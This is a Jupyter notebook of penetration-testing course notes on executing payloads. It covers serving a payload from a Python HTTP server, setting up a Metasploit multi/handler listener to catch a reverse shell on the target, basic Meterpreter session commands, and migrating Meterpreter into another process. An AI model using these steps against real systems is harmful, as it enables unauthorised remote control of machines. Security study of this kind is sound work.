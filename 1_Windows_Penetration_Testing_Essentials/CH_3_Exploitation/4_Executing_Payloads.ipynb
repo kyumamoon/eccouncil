{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# **Executing Payloads**"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Manually getting the payload**\n",
    "- Getting payload onto target system by manually downloading from a web server using python.\n",
    "- Creating SimpleHTTPServer\n",
    "    - Open directory of payload.\n",
    "    - sudo python -m SimpleHTTPServer 80\n",
    "    - sudo python -m http.server 80 , for newer python\n",
    "        - Will serve all files in directory onto the port 80 on the directory host machine.\n"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Create a listening on metasploit machine to listen on reverse shell**\n",
    "- mfsconsole\n",
    "- use exploit/multi/handler\n",
    "- set payload \\<payload to listen to\\>\n",
    "    - set parameters for payload.\n",
    "    - show options, set LHOST and LPORT\n",
    "    - set LHOST \\<kali IP\\>\n",
    "    - run\n",
    "- download and run payload on target\n",
    "    - if worked, meterpreter will be active on kali console handler.\n",
    "    - able to execute commands remotely.\n",
    "- Meterpreter Basic Commands\n",
    "    - ?, command when handler is running.\n",
    "    - background, minimizes current opened session \n",
    "    - sessions, list meterpreter sessions\n",
    "    - sessions \\<SESSION ID\\>, open meterpreter session\n",
    "    - exit, exit meterpreter"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Migrating Meterpreter to another arch process**\n",
    "- ps, list processes\n",
    "- migrate \\<processID\\>"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
